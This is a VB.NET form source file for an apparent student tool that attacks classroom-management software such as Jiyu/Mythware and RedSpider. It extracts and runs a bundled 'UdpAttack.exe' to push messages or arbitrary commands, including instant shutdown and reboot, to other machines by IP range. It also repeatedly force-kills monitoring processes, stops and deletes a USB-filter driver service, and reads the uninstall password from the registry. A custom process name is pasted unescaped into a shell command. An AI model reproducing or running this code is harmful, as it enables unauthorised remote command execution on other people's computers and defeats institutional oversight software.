Imports MaterialSkin.Controls
Imports MaterialSkin

Public Class Form1
    Dim JiyuStat As Boolean
    Dim RccStat As Boolean
    Dim RedSpiderStat As Boolean
    Dim Tab As Integer = 1

    Private Sub FrmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        LocalVersion = "22w31a"
        Delay = 500
        Log = Date.Now + " Program Started" + vbCrLf + Date.Now + " Version: " + LocalVersion + vbCrLf + Date.Now + " Start init" + vbCrLf
        Log += Date.Now + " Start unzip UdpAttack.exe" + vbCrLf
        My.Computer.FileSystem.CreateDirectory("\ProgramData\CloudClassUtility\")
        Try
            My.Computer.FileSystem.DeleteFile("\ProgramData\CloudClassUtility\UdpAttack.exe")
        Catch
        End Try
        My.Computer.FileSystem.WriteAllBytes("\ProgramData\CloudClassUtility\UdpAttack.exe", My.Resources.UdpAttack, True)
        BtnStart.Enabled = True
        BtnStop.Enabled = False
        TbxOutput.Text = Date.Now + " 核心版本: 1.4" + vbCrLf
        TbxOutput.Text += Date.Now + " 本功能原理由 ht0Ruial 大佬提供" + vbCrLf
        TbxOutput.Text += Date.Now + " Tips:" + vbCrLf +
            "指定 IP 地址时, 可以使用以下几种指定方法" + vbCrLf +
            "指定单个IP, 如 192.168.80.12" + vbCrLf +
            "指定IP范围, 如 192.168.80.10-56" + vbCrLf +
            "指定IP所在C段, 如 192.168.80.1/24" + vbCrLf
        StatCard.Text3 = "CloudClassUtility " + LocalVersion
        'MaterialMessageBox.Show("您正在使用预览版, 如果您发现问题, 请到 Github 上反馈.", "CloudClassUtility")
        CardAbout.Text1 = " 版本: " + LocalVersion
        Log += Date.Now + " Done" + vbCrLf
        Log += Date.Now + " Init done" + vbCrLf
    End Sub

    Private Sub PbtnMenu_Click(sender As Object, e As EventArgs) Handles PbtnMenu.Click
        Log += Date.Now + " PbtnMenu.Click" + vbCrLf
        MaterialDrawer1.IsOpen = Not MaterialDrawer1.IsOpen
    End Sub

    Private Sub PbtnClose_Click(sender As Object, e As EventArgs) Handles PbtnClose.Click
        End
    End Sub

    Private Sub PbtnMinimize_Click(sender As Object, e As EventArgs) Handles PbtnMinimize.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub PbtnClose_MouseEnter(sender As Object, e As EventArgs) Handles PbtnClose.MouseEnter
        PbtnClose.BorderStyle = BorderStyle.FixedSingle
    End Sub

    Private Sub PbtnClose_MouseLeave(sender As Object, e As EventArgs) Handles PbtnClose.MouseLeave
        PbtnClose.BorderStyle = BorderStyle.None
    End Sub

    Private Sub PbtnMinimize_MouseEnter(sender As Object, e As EventArgs) Handles PbtnMinimize.MouseEnter
        PbtnMinimize.BorderStyle = BorderStyle.FixedSingle
    End Sub

    Private Sub PbtnMinimize_MouseLeave(sender As Object, e As EventArgs) Handles PbtnMinimize.MouseLeave
        PbtnMinimize.BorderStyle = BorderStyle.None
    End Sub

    Private Sub PbtnMenu_MouseEnter(sender As Object, e As EventArgs) Handles PbtnMenu.MouseEnter
        PbtnMenu.BorderStyle = BorderStyle.FixedSingle
    End Sub

    Private Sub PbtnMenu_MouseLeave(sender As Object, e As EventArgs) Handles PbtnMenu.MouseLeave
        PbtnMenu.BorderStyle = BorderStyle.None
    End Sub

    Private Sub TimStat_Tick(sender As Object, e As EventArgs) Handles TimStat.Tick
        If CheckApplicationIsRun("StudentMain.exe") Then
            JiyuStat = True
        Else
            JiyuStat = False
        End If
        If CheckApplicationIsRun("REDAGENT.exe") Then
            RedSpiderStat = True
        Else
            RedSpiderStat = False
        End If
        If CheckApplicationIsRun("ClassManagerApp.exe") Then
            RccStat = True
        Else
            RccStat = False
        End If
        If RccStat Then
            StatCard.Text2 = "运行中: " + "极域"
        ElseIf RedSpiderStat Then
            StatCard.Text2 = StatCard.Text2 + " 红蜘蛛"
        ElseIf RccStat Then
            StatCard.Text2 = StatCard.Text2 + " 云课堂"
        ElseIf Not RccStat And Not JiyuStat And Not RedSpiderStat Then
            StatCard.Text2 = "红蜘蛛 极域 云课堂均未运行"
        End If
    End Sub

    Private Sub SwitchStat_CheckedChanged(sender As Object, e As EventArgs) Handles SwitchStat.CheckedChanged
        Log += Date.Now + " SwitchStat.CheckedChanged" + vbCrLf
        TimStat.Enabled = SwitchStat.Checked
        StatCard.Text2 = "实时刷新运行状态已关闭"
    End Sub

    Private Sub BtnStart_Click(sender As Object, e As EventArgs) Handles BtnStart.Click
        Log += Date.Now + " BtnStart.Click" + vbCrLf
        TimMain.Interval = Delay
        TimMain.Enabled = True
        BtnStop.Enabled = True
        BtnStart.Enabled = False
    End Sub

    Private Sub BtnStop_Click(sender As Object, e As EventArgs) Handles BtnStop.Click
        Log += Date.Now + " BtnStop.Click" + vbCrLf
        TimMain.Enabled = False
        BtnStart.Enabled = True
        BtnStop.Enabled = False
    End Sub

    Private Sub TimMain_Tick(sender As Object, e As EventArgs) Handles TimMain.Tick
        If CbxJiyu.Checked = True Then
            Shell("taskkill /F /T /IM StudentMain.exe", vbHide)
        ElseIf CbxRcc.Checked = True Then
            Shell("taskkill /F /T /IM ClassManagerApp.exe", vbHide)
            Shell("taskkill /F /T /IM RJRemoteserver.exe", vbHide)
            Shell("taskkill /F /T /IM RjUsbController.exe", vbHide)
        ElseIf CbxRedSpider.Checked = True Then
            Shell("taskkill /F /T /IM REDAGENT.exe", vbHide)
            Shell("taskkill /F /T /IM checkrs.exe", vbHide)
            Shell("taskkill /F /T /IM rscheck.exe", vbHide)
            Shell("taskkill /F /T /IM epointer.exe ", vbHide)
        ElseIf CbxCustom.Checked = True Then
            Shell("taskkill /F /T /IM" + " " + TbxCustom.Text, vbHide)
        End If
    End Sub

    Private Sub TbxCustom_TextChanged(sender As Object, e As EventArgs) Handles TbxCustom.TextChanged
        CbxCustom.Checked = True
        Log += Date.Now + " TbxCustom.TextChanged" + vbCrLf
        Log += Date.Now + " TbxCustom Changed to " + TbxCustom.Text + vbCrLf
        If TbxCustom.Text = "" Then
            CbxCustom.Checked = False
        End If
    End Sub

    Private Sub SliDelay_onValueChanged(sender As Object, newValue As Integer) Handles SliDelay.onValueChanged
        Log += Date.Now + " SliDelay.onValueChanged" + vbCrLf
        Delay = SliDelay.Value
        Log += Date.Now + " Delay changed to " + CStr(Delay) + vbCrLf
    End Sub

    Private Sub TimNotice_Tick(sender As Object, e As EventArgs) Handles TimNotice.Tick
        If Tab = 1 Then
            TcNotice.SelectedTab = TpNotice2
            Tab = 2
        ElseIf Tab = 2 Then
            TcNotice.SelectedTab = TpNotice3
            Tab = 3
        ElseIf Tab = 3 Then
            TcNotice.SelectedTab = TpPreview
            Tab = 4
        ElseIf Tab = 4 Then
            TcNotice.SelectedTab = TpNotice1
            Tab = 1
        End If
    End Sub
    Private Sub BtnSendText_Click(sender As Object, e As EventArgs) Handles BtnSendText.Click
        Log += Date.Now + " SendText.Click" + vbCrLf
        Dim beforDT = Date.Now '计时

        '一添加判断就会提示异常
        'If TbxIPAddress.Text = "" Then
        '    TbxOutput.Text += Date.Now + "IP地址不能为空!" + vbCrLf
        'ElseIf TbxPort.Text = "" Then
        '    TbxOutput.Text += Date.Now + "端口地址不能为空!" + vbCrLf
        'ElseIf TbxSendText.Text = "" & TbxCommand.Text = "" Then
        '    TbxOutput.Text += Date.Now + "请输入内容!" + vbCrLf
        'Else

        Log += Date.Now + " Run \ProgramData\CloudClassUtility\UdpAttack.exe" + " " +
            "-ip" + " " + TbxIPAddress.Text + " " +
            "-p" + " " + TbxPort.Text + " " +
            "-msg" + " " + "" & Chr(34) + TbxSendText.Text & Chr(34) + vbCrLf

        Dim runResult = RunCmd("\ProgramData\CloudClassUtility\UdpAttack.exe" + " " +
                        "-ip" + " " + TbxIPAddress.Text + " " +
                        "-p" + " " + TbxPort.Text + " " +
                        "-msg" + " " + "" & Chr(34) + TbxSendText.Text & Chr(34))
        TbxOutput.Text += Date.Now + vbCrLf + runResult
        Dim afterDT = Date.Now '计时
        Dim UseageTime = CStr(DateDiff(DateInterval.Second, beforDT, afterDT))
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "用时: " + UseageTime + "s" + vbCrLf
        Log += Date.Now + " Done. Result:" + runResult
        'End If
    End Sub

    Private Sub BtnSendCommand_Click(sender As Object, e As EventArgs) Handles BtnSendCommand.Click
        Log += Date.Now + " BtnSendCommand.Click" + vbCrLf
        Dim beforDT = Date.Now '计时

        '一添加判断就会提示异常
        'If TbxIPAddress.Text = "" Then
        '    TbxOutput.Text += Date.Now + "IP地址不能为空!" + vbCrLf
        'ElseIf TbxPort.Text = "" Then
        '    TbxOutput.Text += Date.Now + "端口地址不能为空!" + vbCrLf
        'ElseIf TbxSendText.Text = "" & TbxCommand.Text = "" Then
        '    TbxOutput.Text += Date.Now + "请输入内容!" + vbCrLf
        'Else

        Log += Date.Now + " Run \ProgramData\CloudClassUtility\UdpAttack.exe" + " " +
            "-ip" + " " + TbxIPAddress.Text + " " +
            "-p" + " " + TbxPort.Text + " " +
            "-c" + " " & Chr(34) + TbxCommand.Text & Chr(34) + vbCrLf
        Dim runResult = RunCmd("\ProgramData\CloudClassUtility\UdpAttack.exe" + " " +
                        "-ip" + " " + TbxIPAddress.Text + " " +
                        "-p" + " " + TbxPort.Text + " " +
                        "-c" + " " & Chr(34) + TbxCommand.Text & Chr(34))
        TbxOutput.Text += Date.Now + vbCrLf + runResult
        Dim afterDT = Date.Now '计时
        Dim UseageTime = CStr(DateDiff(DateInterval.Second, beforDT, afterDT))
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "用时: " + UseageTime + "s" + vbCrLf
        Log += Date.Now + " Done. Result:" + runResult
        'End If
    End Sub

    Private Sub BtnUniJiyuUsbDriver_Click(sender As Object, e As EventArgs) Handles BtnUniJiyuUsbDriver.Click
        Log += Date.Now + " BtnUniJiyuUsbDriver.Click" + vbCrLf
        Dim beforDT = Date.Now '计时
        Dim runResult
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "Tips: 如果未生效,请尝试使用管理员权限运行" + vbCrLf
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "执行 sc stop TDFileFilter" + vbCrLf
        runResult = RunCmd("sc stop TDFileFilter")
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "Done. Result:" + runResult + vbCrLf
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "执行 sc delete TDFileFilter" + vbCrLf
        runResult = RunCmd("sc delete TDFileFilter")
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "Done. Result:" + runResult + vbCrLf
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "完成" + vbCrLf
        Dim afterDT = Date.Now '计时
        Dim UseageTime = CStr(DateDiff(DateInterval.Second, beforDT, afterDT))
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "用时: " + UseageTime + "s" + vbCrLf
        Log += TbxOutput.Text
    End Sub

    Private Sub GetJiyuPasswd_Click(sender As Object, e As EventArgs) Handles GetJiyuPasswd.Click
        Log += Date.Now + " GetJiyuPasswd.Click" + vbCrLf
        Dim beforDT = Date.Now '计时
        Dim JiyuPasswd
        ''' 测试计时用
        'Using getUrl As New Net.WebClient()
        'Dim data As Byte() = getUrl.DownloadData("https://drive.cookie987.tk/public/CloudClassUtility/notice.rtf")
        'End Using
        '''
        JiyuPasswd = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\TopDomain\e-learning Class Standard\1.00\", "UninstallPasswd", Nothing)
        If JiyuPasswd = Nothing Then
            TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "读取失败, 请检查是否有管理员权限或极域是否安装." + vbCrLf
        ElseIf JiyuPasswd = "passwd[123456]" Then
            TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "警告: 读取到的密码为 123456 ,可能为假密码. 如果解锁失败, 可尝试使用超级密码: mythware_super_password" + vbCrLf + DateTime.Now + " 读取到的密码 ([ ]内即密码): " + JiyuPasswd + vbCrLf + "Done." + vbCrLf
        Else
            TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "读取到的密码 ([ ]内即密码): " + JiyuPasswd + vbCrLf + Date.Now + " Done" + vbCrLf
        End If
        Dim afterDT = Date.Now '计时
        Dim UseageTime = CStr(DateDiff(DateInterval.Second, beforDT, afterDT))
        TbxOutput.Text = TbxOutput.Text + Date.Now + " " + "用时: " + UseageTime + "s" + vbCrLf
        Log += Date.Now + vbCrLf + TbxOutput.Text + vbCrLf
    End Sub

    Private Sub SwitchNotice_CheckedChanged(sender As Object, e As EventArgs) Handles SwitchNotice.CheckedChanged
        TimNotice.Enabled = SwitchNotice.Checked
    End Sub

    Private Sub BtnReCheckUpdate_Click(sender As Object, e As EventArgs) Handles BtnReCheckUpdate.Click
        Log += Date.Now + " BtnReCheckUpdate.Click" + vbCrLf
        Using getUrl As New Net.WebClient()
            Try
                Dim data As Byte() = getUrl.DownloadData("https://drive.cookie987.tk/public/CloudClassUtility/notice.rtf")
                Dim content As String = System.Text.Encoding.Default.GetString(data)
                Log += Date.Now + " Start check update" + vbCrLf
                RtbUpdate.Rtf = content
                data = getUrl.DownloadData("https://drive.cookie987.tk/public/CloudClassUtility/version.txt")
                content = System.Text.Encoding.Default.GetString(data)
                TbxVersion.Text = "云端版本: " + content + vbCrLf + "本地版本: " + LocalVersion
            Catch ex As Exception
                Log += Date.Now + " Error 0x01 Network Problem" + vbCrLf
                TbxVersion.Text = "本地版本: " + LocalVersion
                MaterialMessageBox.Show("查询更新信息失败, 请检查您的网络连接或云端服务器出现故障.", "CloudClassUtility")
            End Try
        End Using
    End Sub

    Private Sub BtnHalt_Click(sender As Object, e As EventArgs) Handles BtnHalt.Click
        Log += Date.Now + " BtnHalt.Click" + vbCrLf
        TbxCommand.Text = "shutdown /s /t 0"
    End Sub

    Private Sub BtnReboot_Click(sender As Object, e As EventArgs) Handles BtnReboot.Click
        Log += Date.Now + " BtnReboot.Click" + vbCrLf
        TbxCommand.Text = "shutdown /r /t 0"
    End Sub

    Private Sub BtnExportLog_Click(sender As Object, e As EventArgs) Handles BtnExportLog.Click
        Log += Date.Now + " BtnExportLog.Click" + vbCrLf
        SaveFileDialog1.Filter = "日志文件 (*.log)|*.log|所有文件 (*.*)|*.*"
        If SaveFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Try
                My.Computer.FileSystem.WriteAllText(SaveFileDialog1.FileName, Log, True)
                Log += Date.Now + " Log writed" + vbCrLf
                MaterialMessageBox.Show("导出成功.", "CloudClassUtility")
            Catch ex As Exception
                MaterialMessageBox.Show("导出失败, 请检查写入权限.", "CloudClassUtility")
            End Try
        End If
    End Sub

    Private Sub BtnCleanLog_Click(sender As Object, e As EventArgs) Handles BtnCleanLog.Click
        Log = Nothing
    End Sub

    Private Sub TimLog_Tick(sender As Object, e As EventArgs) Handles TimLog.Tick
        TbxLog.Text = Log
    End Sub

    Private Sub SwitchLog_CheckedChanged(sender As Object, e As EventArgs) Handles SwitchLog.CheckedChanged
        TimLog.Enabled = SwitchLog.Checked
    End Sub

    Private Sub MaterialTabControl1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MaterialTabControl1.SelectedIndexChanged
        If MaterialTabControl1.SelectedIndex = 1 Then
            TimNotice.Enabled = False
            TimLog.Enabled = False
        Else
            TimNotice.Enabled = SwitchNotice.Checked
            TimLog.Enabled = SwitchLog.Checked
        End If
    End Sub

    Private Sub TbxCustom_Enter(sender As Object, e As EventArgs) Handles TbxCustom.Enter
        TimNotice.Enabled = False
        TimLog.Enabled = False
    End Sub

    Private Sub TbxCustom_Leave(sender As Object, e As EventArgs) Handles TbxCustom.Leave
        TimNotice.Enabled = SwitchNotice.Checked
        TimLog.Enabled = SwitchLog.Checked
    End Sub
End Class